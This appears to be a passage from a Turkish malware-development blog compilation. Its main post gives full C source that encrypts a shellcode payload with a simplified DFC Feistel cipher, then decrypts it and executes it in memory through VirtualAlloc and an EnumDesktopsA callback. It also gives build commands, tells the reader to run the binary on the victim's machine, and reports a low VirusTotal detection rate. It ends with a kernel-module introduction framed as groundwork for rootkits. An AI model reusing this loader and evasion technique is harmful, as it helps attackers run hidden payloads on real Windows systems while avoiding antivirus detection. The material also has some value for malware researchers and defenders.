0x21, 0x0, 0x3d, 0x5e, 0x2e, 0x2e, 0x5e, 0x3d, 0x0
};

Ayrıca, bu kod padding şemasını ve payload uzunluğunu doğru bir şekilde korur.
demo 2

Şimdi her şeyi çalışırken görelim. Linux makinemde derleyelim:
x86_64-w64-mingw32-gcc -O2 hack2.c -o hack2.exe \
-I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections -Wno-write-strings \
-fno-exceptions -fmerge-all-constants \
-static-libstdc++ -static-libgcc

+++++++++++++++++++++++++++++++++++++++++++++++
Sonra, sadece mağdurun makinesinde çalıştırın (benim durumumda Windows 11 x64):
.\hack2.exe
+++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++
Gördüğünüz gibi, her şey mükemmel çalıştı!=..=
Shannon entropisini hesaplama:
python3 entropy.py -f hack2.exe
+++++++++++++++++++++++++++++++++++++++++++++++

payload .text bölümümüzde.
Bildiğiniz gibi, araştırmamda ve bu blogdaki birçok şifreleme algoritması Feistel ağlarını kullanmaktadır.
kriptanaliz


Biham ve Shamir (E. Biham ve A. Shamir, “Snefru, Khafre, REDOC–II, LOKI ve Lucifer'in Farklı Kriptanalizi,” Advances in Cryptology—CRYPTO ’91 Proceedings, 1992, s. 156–171 ve E. Biham ve A. Shamir, Data Encryption Standard'ın Farklı Kriptanalizi, Springer–Verlag, 1993) ilk Lucifer sürümünün, 32-bitlik bloklar ve 8 tur kullanarak, farklı kriptanalize karşı hassas olduğunu ve bunun 40 seçilen düz metin ve \( 2^{29} \) adım gerektirdiğini göstermiştir; benzer şekilde, aynı saldırı, 128-bitlik bloklar ve 8 tur ile Lucifer'i tehlikeye atabilir, bunun için 60 seçilen düz metin ve \( 2^{53} \) adım gereklidir. Bir farklı kriptanalitik saldırı, 24 seçilen düz metinle 18 tur, 128-bit Lucifer'i 221 adımda başarıyla tehlikeye atar. 

Umarım bu gönderi, zararlı yazılım araştırmacıları, C/C++ programcıları için faydalı olur, mavi takım üyelerine bu ilginç şifreleme tekniği hakkında farkındalık yaratır ve kırmızı takım üyelerinin cephaneliğine bir silah ekler.

Malware and cryptography 1
Github’taki kaynak kod
E. Biham and A. Shamir, “Differential Cryptanalysis of Snefru, Khafre, REDOC–II, LOKI,
and Lucifer,” Advances in Cryptology—CRYPTO ’91 Proceedings, 1992, pp. 156–171


97. zararlı yazılım ve kriptografi araştırması - bölüm 6 (34): payload’u DFC algoritmasıyla şifreleme. Basit C örneği.

﷽

+++++++++++++++++++++++++++++++++++++++++++++++
Lüksemburg'da bir konferansta yaptığım sunum ve seminerden sonra, Windows işletim sisteminin iç yapısındaki kriptografik fonksiyonların kötüye kullanımı üzerine değindiğimde, birçok meslektaşım ve okuyucum, kötü amaçlı yazılımların geliştirilmesi sırasında kriptografinin kullanımına dair giderek daha fazla soru sormaya başladı.


Bu yazı, kötü amaçlı yazılım geliştirmede DFC (Decorrelated Fast Cipher) kullanımına ilişkin kendi araştırmamın bir sonucudur. Her zamanki gibi, çeşitli şifreleme algoritmalarını incelerken, bunu payload'u şifrelemek/şifresini çözmek için uygularsak ne olacağını kontrol etmeye karar verdim.
DFC

Decorrelated Fast Cipher (DFC), 1998 yılında École Normale Supérieure, CNRS ve France Telecom’daki kriptograflar tarafından Serge Vaudenay liderliğinde geliştirildi. Gelişmiş Şifreleme Standardı (AES) yarışmasına aday olarak tasarlanan DFC, 8 tur Feistel ağı ve 128 bitlik blok boyutu kullanan simetrik bir blok şifreleme algoritmasıdır. Sonuç olarak AES standardı olarak seçilmese de, DFC özellikle PEANUT şifre ailesi içinde kriptografik araştırmalara katkıda bulundu.
Decorrelated Fast Cipher (DFC), her turda 128 bitlik bir bloğu iki 64 bitlik yarıya bölen 8 turlu bir Feistel ağına dayanır. DFC, değişken uzunlukta bir anahtardan (en fazla 256 bit) 8 benzersiz tur anahtarı oluşturmak için bir anahtar planı kullanır, ancak genellikle 128 bitlik bir anahtarla uygulanır. Her tur, bloğun bir yarısına özel bir şifreleme fonksiyonu uygular, onu diğer yarısıyla birleştirir ve ardından yarıları değiştirir – bu, anahtarların sırasını tersine çevirerek kolayca şifre çözmeyi mümkün kılan klasik bir Feistel yapısıdır.
DFC'nin mimarisi, diferansiyel ve doğrusal kriptoanalize karşı mükemmel güvenlik sağlamayı amaçlar ve modern kriptografik saldırılara karşı direnmek için şifrelenmiş veriler içindeki istatistiksel ilişkileri azaltan dekorrelasyon teorisini kullanmasıyla dikkat çeker. Her turun şifreleme fonksiyonu, ana anahtardan türetilmiş bir çift 64 bitlik alt anahtar kullanır, bu da şifreyi donanım ve yazılım uygulamaları için uygun hale getirir.
DFC, nihai AES standardı olarak seçilmese de, dekorrelasyon tabanlı saldırılara karşı dirençli yeni teknikler sundu ve simetrik blok şifreleri için güçlü güvenlik özelliklerini vurguladı. DFC şu anda, kriptoanalize karşı direncini artırmak için benzersiz matematiksel dönüşümler kullanan PEANUT ailesinin (Pretty Encryption Algorithm with n-Universal Transformation) bir üyesidir.
pratik örnek

Bunu pratikte uygulayalım. DFC tabanlı şifreleme ve şifre çözme fonksiyonlarının nasıl uygulanması gerektiğini anlamak için uygulamayı adım adım inceleyelim ve payload şifrelemeye odaklanalım. Bu yaklaşım, kodun her bölümünü ve DFC şifresinin işlevselliğine nasıl katkıda bulunduğunu anlamanıza yardımcı olacaktır.
Öncelikle sabitleri ve anahtar değişkenleri tanımlayın:
#define ROUNDS 8
#define BLOCK_SIZE 16
Ardından anahtar planı oluşturulmalıdır.
Anahtar planı fonksiyonu, orijinal şifreleme anahtarına dayalı olarak sekiz adet 128 bitlik tur anahtarı üretir. Bu tur anahtarları, Feistel turlarının her birinde veri bloğunun her yarısı üzerinde işlemler gerçekleştirmek için kullanılır:
void key_schedule(uint8_t* key) {
for (int i = 0; i < ROUNDS; i++) {
for (int j = 0; j < 16; j++) {
	K[i][j] = key[j] ^ (i + j);
}
}
}
Tur anahtarları, ana anahtarın her baytının tur ve bayt indeksleri ile XORlanmasıyla türetilir, bu da her tur için benzersiz anahtarlar oluşturur.


Sonraki adım Feistel tur fonksiyonunun uygulanmasıdır. DFC’de her tur, bloğun sol ve sağ yarıları üzerinde işlemler gerçekleştirir. Tur fonksiyonu G, sol ve sağ yarıları ve bir roundKey alır.
Bu fonksiyon: sol ve sağ yarıları değiştirir ve sol yarıyı (F fonksiyonu uygulandıktan sonra) sağ yarı ve geçerli tur anahtarı ile XORlar:
// DFC G function applies Feistel structure in each round
void G(uint32_t* left, uint32_t* right, uint8_t* roundKey) {
uint32_t tempRight = *right;
*right = *left ^ F(*right, *(uint32_t*)roundKey);
*left = tempRight;
}
F, Feistel yapısının çekirdek fonksiyonudur. Kendi uygulamamda, Decorrelated Fast Cipher (DFC) turu için F fonksiyonu, her turda doğrusal olmayanlık ve yayılımı artırmak için bit kaydırma ve XOR işlemleri kullanır:
// function F for DFC round (simplified for illustration)
uint32_t F(uint32_t left, uint32_t key_part) {
	return rotl(left + key_part, 3) ^ key_part;
}
Burada, left parametresi tipik olarak Feistel turundaki veri bloğunun sol yarısıdır, key_part ise her Feistel turuna özgü 32 bitlik bir tur anahtarı parçasıdır.
Bu fonksiyonun temel mantığı basittir.


Sol giriş (veri bloğunun yarısı), key_part ile toplanır. Bu toplama, mevcut veri ve anahtara bağlılığı artırarak her turun belirli tur anahtarına duyarlı olmasını sağlar.


Toplamanın sonucu, 3 bit sola döndürülür (rotl(..., 3)). Bit kaydırma, veriyi yaymak için kullanılır ve yayılımı artırır. Rotl fonksiyonu, bitleri 3 pozisyon sola kaydırır ve en soldaki bitler sağa döner.
Son olarak, kaydırma işleminin sonucu key_part ile XORlanır. XOR, doğrusal olmayanlığı daha da artırır ve key_part veya left'teki küçük değişikliklerin F fonksiyonunun çıktısında büyük değişikliklere neden olmasını sağlar.
Sonraki fonksiyon, blok şifreleme mantığıdır.
dfc_encrypt fonksiyonu, Feistel yapısında 8 tur boyunca şifreleme gerçekleştirir. Her tur, anahtar planından türetilmiş farklı bir tur anahtarı kullanır:
// DFC encryption function
void dfc_encrypt(uint32_t* block, uint8_t* key) {
uint32_t left = block[0], right = block[1];

// perform 8 rounds of encryption
for (int i = 0; i < ROUNDS; i++) {
	G(&left, &right, K[i]);
}
// final left-right swap
block[0] = right;
block[1] = left;
}
Bu fonksiyon, giriş bloğundan sol ve sağ değişkenleri başlatır. Ardından, 8 tur boyunca G fonksiyonunu sol ve sağ değişkenlere, ilgili tur anahtarı ile birlikte uygular.
Son olarak, sol ve sağ değişkenleri değiştirerek Feistel turunu tamamlar ve bloğu günceller.
Şifre çözme fonksiyonu dfc_decrypt, şifrelemeyi yansıtır, ancak turlar ters sırayla uygulanır:
// DFC decryption function
void dfc_decrypt(uint32_t* block, uint8_t* key) {
uint32_t left = block[0], right = block[1];

// perform 8 rounds of decryption in reverse
for (int i = ROUNDS - 1; i >= 0; i--) {
	G(&left, &right, K[i]);
}

// final left-right swap
block[0] = right;
block[1] = left;
}
Her zamanki gibi, dfc_encrypt_shellcode, padding uygulayarak ve ardından her 128 bitlik bloğu şifreleyerek shellcode şifrelemeye hazırlar:
// function to encrypt shellcode using DFC
void dfc_encrypt_shellcode(unsigned char* shellcode, int shellcode_len,
uint8_t* key) {
key_schedule(key); // generate subkeys
int i;
uint32_t* ptr = (uint32_t*)shellcode;
for (i = 0; i < shellcode_len / BLOCK_SIZE; i++) {
dfc_encrypt(ptr, key);
ptr += 4; // move to the next 128-bit block (4 * 32-bit words)
}
// handle remaining bytes by padding with 0x90 (NOP)
int remaining = shellcode_len % BLOCK_SIZE;
if (remaining != 0) {
unsigned char pad[BLOCK_SIZE] = { 0x90 };
memcpy(pad, ptr, remaining);
dfc_encrypt((uint32_t*)pad, key);
memcpy(ptr, pad, remaining);
}
}
Bu fonksiyon, key_schedule çağrısı yaparak tur anahtarlarını başlatır. Ardından, ana shellcode'u 128 bitlik bloklar halinde şifreler ve shellcode uzunluğu blok boyutunun katı değilse padding uygular.
Sonraki adım şifre çözme mantığıdır:
// function to decrypt shellcode using DFC
void dfc_decrypt_shellcode(unsigned char* shellcode, int shellcode_len,
uint8_t* key) {
key_schedule(key); // generate subkeys
int i;
uint32_t* ptr = (uint32_t*)shellcode;
for (i = 0; i < shellcode_len / BLOCK_SIZE; i++) {
dfc_decrypt(ptr, key);
ptr += 4;
}

// handle remaining bytes by padding
int remaining = shellcode_len % BLOCK_SIZE;
if (remaining != 0) {
unsigned char pad[BLOCK_SIZE] = { 0x90 };
memcpy(pad, ptr, remaining);
dfc_decrypt((uint32_t*)pad, key);
memcpy(ptr, pad, remaining);
}
}
Son olarak, tümünü birleştirerek main içinde çalıştırıyoruz:
int main() {
unsigned char my_payload[] =
"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
"\x2e\x2e\x5e\x3d\x00";

int my_payload_len = sizeof(my_payload);
int pad_len = my_payload_len +
(BLOCK_SIZE - my_payload_len % BLOCK_SIZE) % BLOCK_SIZE;
unsigned char padded[pad_len];
memset(padded, 0x90, pad_len); // pad with NOPs
memcpy(padded, my_payload, my_payload_len);
printf("original shellcode:\n");
for (int i = 0; i < my_payload_len; i++) {
	printf("%02x ", my_payload[i]);
}
printf("\n\n");

uint8_t key[8] = { 0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC, 0xDE, 0xF0 };

dfc_encrypt_shellcode(padded, pad_len, key);

printf("encrypted shellcode:\n");
for (int i = 0; i < pad_len; i++) {
	printf("%02x ", padded[i]);
}
printf("\n\n");

dfc_decrypt_shellcode(padded, pad_len, key);

printf("decrypted shellcode:\n");
for (int i = 0; i < my_payload_len; i++) {
	printf("%02x ", padded[i]);
}
printf("\n\n");

// allocate and execute decrypted shellcode
LPVOID mem = VirtualAlloc(NULL, my_payload_len, MEM_COMMIT,
PAGE_EXECUTE_READWRITE);
RtlMoveMemory(mem, padded, my_payload_len);
EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, NULL);
return 0;
}
Gördüğünüz gibi, main fonksiyonunda sadece meow-meow messagebox payload şifreleyip çözdüm.
Tam kaynak kod hack.c:
/*
* hack.c
* encrypt/decrypt payload via DFC (Decorrelated Fast Cipher) algorithm
* author: @cocomelonc
* https://cocomelonc.github.io/malware/2024/11/10/malware-cryptography-34.html
*/
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <windows.h>

#define ROUNDS 8 // DFC uses 8 rounds of encryption
#define BLOCK_SIZE 16 // DFC operates on 128-bit (16-byte) blocks

// subkeys generated from the main key
uint8_t K[ROUNDS][16];

// rotate left function
uint32_t rotl(uint32_t x, int shift) {
	return (x << shift) | (x >> (32 - shift));
}

// function F for DFC round (simplified for illustration)
uint32_t F(uint32_t left, uint32_t key_part) {
	return rotl(left + key_part, 3) ^ key_part;
}
// DFC G function applies Feistel structure in each round
void G(uint32_t* left, uint32_t* right, uint8_t* roundKey) {
uint32_t tempRight = *right;
*right = *left ^ F(*right, *(uint32_t*)roundKey);
*left = tempRight;
}

// key schedule for DFC
void key_schedule(uint8_t* key) {
for (int i = 0; i < ROUNDS; i++) {
for (int j = 0; j < 16; j++) {
	K[i][j] = key[j % 8] ^ (i + j); // generate subkey for each round
}
}
}

// DFC encryption function
void dfc_encrypt(uint32_t* block, uint8_t* key) {
uint32_t left = block[0], right = block[1];
// perform 8 rounds of encryption
for (int i = 0; i < ROUNDS; i++) {
	G(&left, &right, K[i]);
	}
	// final left-right swap
block[0] = right;
block[1] = left;
}

// DFC decryption function
void dfc_decrypt(uint32_t* block, uint8_t* key) {
uint32_t left = block[0], right = block[1];

// perform 8 rounds of decryption in reverse
for (int i = ROUNDS - 1; i >= 0; i--) {
	G(&left, &right, K[i]);
}

// final left-right swap
block[0] = right;
block[1] = left;
}

// function to encrypt shellcode using DFC
void dfc_encrypt_shellcode(unsigned char* shellcode, int shellcode_len,
uint8_t* key) {
key_schedule(key); // generate subkeys
int i;
uint32_t* ptr = (uint32_t*)shellcode;
for (i = 0; i < shellcode_len / BLOCK_SIZE; i++) {
dfc_encrypt(ptr, key);
ptr += 4; // move to the next 128-bit block (4 * 32-bit words)
}
// handle remaining bytes by padding with 0x90 (NOP)
int remaining = shellcode_len % BLOCK_SIZE;
if (remaining != 0) {
unsigned char pad[BLOCK_SIZE] = { 0x90 };
memcpy(pad, ptr, remaining);
dfc_encrypt((uint32_t*)pad, key);
memcpy(ptr, pad, remaining);
}
}

// function to decrypt shellcode using DFC
void dfc_decrypt_shellcode(unsigned char* shellcode, int shellcode_len,
uint8_t* key) {
key_schedule(key); // generate subkeys
int i;
uint32_t* ptr = (uint32_t*)shellcode;
for (i = 0; i < shellcode_len / BLOCK_SIZE; i++) {
dfc_decrypt(ptr, key);
ptr += 4;
}
// handle remaining bytes by padding
int remaining = shellcode_len % BLOCK_SIZE;
if (remaining != 0) {
unsigned char pad[BLOCK_SIZE] = { 0x90 };
memcpy(pad, ptr, remaining);
dfc_decrypt((uint32_t*)pad, key);
memcpy(ptr, pad, remaining);
}
}

int main() {
unsigned char my_payload[] =
"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
"\x2e\x2e\x5e\x3d\x00";

int my_payload_len = sizeof(my_payload);
int pad_len = my_payload_len +
(BLOCK_SIZE - my_payload_len % BLOCK_SIZE) % BLOCK_SIZE;
unsigned char padded[pad_len];
memset(padded, 0x90, pad_len); // pad with NOPs
memcpy(padded, my_payload, my_payload_len);
printf("original shellcode:\n");
for (int i = 0; i < my_payload_len; i++) {
	printf("%02x ", my_payload[i]);
}
printf("\n\n");

uint8_t key[8] = { 0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC, 0xDE, 0xF0 };

dfc_encrypt_shellcode(padded, pad_len, key);

printf("encrypted shellcode:\n");
for (int i = 0; i < pad_len; i++) {
	printf("%02x ", padded[i]);
}
printf("\n\n");

dfc_decrypt_shellcode(padded, pad_len, key);

printf("decrypted shellcode:\n");
for (int i = 0; i < my_payload_len; i++) {
	printf("%02x ", padded[i]);
}
printf("\n\n");

// allocate and execute decrypted shellcode
LPVOID mem = VirtualAlloc(NULL, my_payload_len, MEM_COMMIT,
PAGE_EXECUTE_READWRITE);
RtlMoveMemory(mem, padded, my_payload_len);
EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, NULL);
return 0;
}

Her zamanki gibi, bazı yazdırma mantıkları yalnızca mantığın doğruluğunu kontrol etmek ve EnumDesktopsA aracılığıyla payload çalıştırmak içindir.
Demo

Hadi her şeyi çalışırken görelim. Derleyin (kendi Linux makinemde):
x86_64-w64-mingw32-gcc -O2 hack.c -o hack.exe \
-I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections \
-Wno-write-strings -fno-exceptions -fmerge-all-constants \
-static-libstdc++ -static-libgcc

+++++++++++++++++++++++++++++++++++++++++++++++

Ardından, sadece hedef makinede (benim durumumda Windows 11 x64) çalıştırın:
.\hack.exe
+++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++

Gördüğünüz gibi, her şey mükemmel çalıştı!=..=
Shannon entropisi hesaplama:
python3 entropy.py -f hack.exe
+++++++++++++++++++++++++++++++++++++++++++++++
.text bölümündeki payload.


Kötü amaçlı yazılım tarayıcısı ile tarama:
+++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++
https://websec.net/scanner/result/8d7862b2-dbba-48bb-924c-a3694cac3269
VirusTotal'a yükleme:
+++++++++++++++++++++++++++++++++++++++++++++++
https://www.virustotal.com/gui/file/9d702d3194ef3a6160f9ab7f6b30ebaae92c365fa4
c12368c7e9ec589ebbe1fd/detection 
Gördüğünüz gibi, yalnızca 72 antivirüs motorundan 29'u dosyamızı kötü amaçlı olarak algılıyor.

İlginç sonuç.
Bildiğiniz gibi, araştırmalarımda ve bu blogdaki birçok şifreleme algoritması Feistel ağlarını kullanıyor.
cryptoanalysis


Decorrelated Fast Cipher (DFC) üzerine yapılan kriptanaliz, özellikle diferansiyel analiz yoluyla yapısındaki güvenlik açıklarını ortaya çıkarmıştır. 1999 yılında, kriptograflar Lars Knudsen ve Vincent Rijmen (Lars R. Knudsen ve Vincent Rijmen. “On The Decorrelated Fast Cipher (DFC) and Its Theory”. Department of Informatics, University of Bergen, N-5020 Bergen. 24 Mart 1999. 6. Uluslararası Hızlı Yazılım Şifreleme Çalıştayı (FSE '99). Roma: Springer-Verlag. s. 81–94) diferansiyel saldırılar kullanılarak DFC’nin 8 turdan oluşan yapısının zayıflatılabileceğini keşfetti. Çalışmaları, bir diferansiyel saldırının DFC’nin 8 turunun 6’sını başarılı bir şekilde kırabileceğini ve şifrenin Feistel turlarının belirli bölümlerine girilen farklılıklara karşı hassasiyetini ortaya çıkardı. Bu saldırı, DFC’nin yayılım özelliklerindeki zayıflıkları göstererek, AES yarışması için tasarlanmış olmasına rağmen, DFC’nin bazı diğer adaylara kıyasla kriptanalitik tekniklere karşı daha az dirençli olduğunu ortaya koydu.
Umarım bu yazı, kötü amaçlı yazılım araştırmacıları, C/C++ programcıları için faydalı olur, mavi takım üyelerinin bu ilginç şifreleme tekniği hakkında farkındalığını artırır ve kırmızı takım üyelerinin cephaneliğine bir silah ekler.
https://en.wikipedia.org/wiki/DFC_(cipher)
On The Decorrelated Fast Cipher (DFC) and Its Theory. Lars R. Knudsen and Vincent
Rijmen
Malware And Hunting For Persistence: How Adversaries Exploit Your Windows? -
Cocomelonc. HACKLU 2024
Malware and cryptography 1
Github’taki kaynak kod


98. Linux kötü amaçlı yazılım geliştirme 1: Kernel hacklemeye giriş. Basit C örneği.

﷽

+++++++++++++++++++++++++++++++++++++++++++++++

Aslında, bu gönderiye “Kötü Amaçlı Yazılım Geliştirme Hilesi Bölüm 41” gibi başka bir ad verilebilirdi, ancak burada yine okuyucularımın bana sorduğu birçok soruya cevap veriyorum. Linux için nasıl kötü amaçlı yazılım geliştirebilirim?


Belki de bu gönderi, aynı zamanda bir dizi gönderinin başlangıç noktası olacaktır (beni uzun süredir okuyanlar muhtemelen başladığım ancak henüz mantıksal sonuca ulaştırmadığım birçok farklı gönderi serim olduğunu fark etmişlerdir).

Dürüst olmak gerekirse, Linux çekirdeği için programlama konusundaki son deneyimim üniversitede yaklaşık 10+ yıl önceydi, o zamandan beri çok şey değişti, bu yüzden rootkit, stealer gibi kötü amaçlı yazılımlar yazmaya çalışmaya karar verdim...

Öncelikle, sistemimde hiçbir şeyi bozmamak için bir Linux sanal makinesi - Xubuntu 20.04 kurdum. Daha yeni bir Ubuntu (Xubuntu, Lubuntu) sürümü yükleyebileceğinizi düşünüyorum, ancak 20.04 sürümü deneyler için oldukça uygun:
+++++++++++++++++++++++++++++++++++++++++++++++
pratik örnek

Örneğin, bir kernel rootkit gibi kötü amaçlı bir yazılım oluşturmamız gerekiyorsa, geliştirdiğimiz kod, oluşturduğumuz çekirdek modüllerini kullanarak çekirdek seviyesinde ayrıcalıklarla (ring 0) çalıştırılabilir. Bu rolde çalışmanın bazı zorlukları olabilir. Bir yandan, çalışmalarımız kullanıcı ve kullanıcı alanı araçları tarafından fark edilmez. Ancak bir hata yaparsak, bunun ciddi sonuçları olabilir. Çekirdek kendi kusurlarından kendini koruyamaz, bu da tüm sistemi çökertme riskimiz olduğu anlamına gelir. Sanal makine (VM) kullanmak, Xubuntu’muzda geliştirme yapmanın zorluklarını azaltmaya yardımcı olarak bunu çok daha yönetilebilir bir gereksinim haline getirecektir.

Modülleri içe aktarmakla başlayalım:
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
Bu #include ifadeleri, çekirdek modülü programlaması için gerekli başlık dosyalarını içerir:
linux/init.h - modül başlatma ve temizleme için makrolar ve fonksiyonlar içerir.
linux/module.h - modül programlaması için makrolar ve fonksiyonlar içerir.
linux/kernel.h - çekirdek geliştirme için çeşitli fonksiyonlar ve makrolar sağlar.

MODULE_LICENSE("GPL");
MODULE_AUTHOR("cocomelonc");
MODULE_DESCRIPTION("kernel-test-01");
MODULE_VERSION("0.001");
Bu makrolar modül hakkında meta veriler tanımlar:
MODULE_LICENSE("GPL") - modülün yayınlandığı lisansı belirtir. Burada, GNU Genel Kamu Lisansı’dır.
MODULE_AUTHOR("cocomelonc") - modülün yazarını belirtir.
MODULE_DESCRIPTION("kernel-test-01") - modül hakkında açıklama sağlar.
MODULE_VERSION("0.001") - modülün sürümünü belirtir.
Sonraki birkaç satırda başlatma fonksiyonunu tanımlıyoruz:
static int __init hack_init(void) {
printk(KERN_INFO "Meow-meow!\n");
return 0;
}
Bu fonksiyon, modülün başlatma fonksiyonudur:
static int __init hack_init(void) - fonksiyonu statik (bu dosyaya özel) olarak tanımlar ve __initmakrosunu kullanarak bir başlatma fonksiyonu olarak işaretler.
printk(KERN_INFO "Meow-meow!\n") - çekirdek günlüğüne "Meow-meow!" mesajını bilgi seviyesinde yazar.
return 0 - başarılı başlatmayı göstermek için 0 döndürür.
Sonraki fonksiyon ise hack_exit fonksiyonudur:
static void __exit hack_exit(void) {
	printk(KERN_INFO "Meow-bow!\n");
}
Bu fonksiyon, modülün temizleme fonksiyonudur:
static void __exit hack_exit(void) - fonksiyonu statik olarak tanımlar ve __exit makrosunu kullanarak bir çıkış (temizleme) fonksiyonu olarak işaretler.
printk(KERN_INFO "Meow-bow!\n") - çekirdek günlüğüne "Meow-bow!" mesajını yazar.
Daha sonra, başlatma ve temizleme fonksiyonlarını kaydediyoruz:
module_init(hack_init);
module_exit(hack_exit);
Böylece, tam kaynak kodu şu şekilde görünmektedir hack.c:
/*
* hack.c
* introduction to linux kernel hacking
* author @cocomelonc
* https://cocomelonc.github.io/linux/2024/06/20/kernel-hacking-1.html
*/
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("cocomelonc");
MODULE_DESCRIPTION("kernel-test-01");
MODULE_VERSION("0.001");

static int __init hack_init(void) {
printk(KERN_INFO "Meow-meow!\n");
return 0;
}

static void __exit hack_exit(void) {
	printk(KERN_INFO "Meow-bow!\n");
}

module_init(hack_init);
module_exit(hack_exit);
Bu kod, bir Linux çekirdek modülünün temel yapısını, başlatma ve temizleme fonksiyonlarının nasıl tanımlanacağını ve modül hakkında nasıl meta veriler sağlanacağını göstermektedir.
Demo

Şimdi bu modülü çalışırken görelim. Derlemeden önce şunları yüklemeniz gerekir:
$ apt update
$ apt install build-essential linux-headers-$(uname -r)
Derlemek için şu içeriğe sahip bir Makefile dosyası oluşturun:
obj-m += hack.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean

Sağlanan Makefile, bir Linux çekirdek modülünü derlemek ve temizlemek için kullanılır.
obj-m değişkeni, çekirdek modülü olarak derlenecek nesne dosyalarını listelemek için kullanılır. hack.o, hack.c kaynak dosyasından derlenecek olan nesne dosyasıdır. += operatörü, hack.o dosyasını modül olarak derlenecek nesne dosyaları listesine ekler.
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
Bu komut, modülü derlemek için make programını çağırır.
-C /lib/modules/$(shell uname -r)/build - çalışma dizinini mevcut çekirdeğin derleme dizinine değiştirir. $(shell uname -r), mevcut çekirdeğin sürümünü alır ve /lib/modules/$(shell uname -r)/build dizini, çekirdek derleme dizininin bulunduğu yerdir.
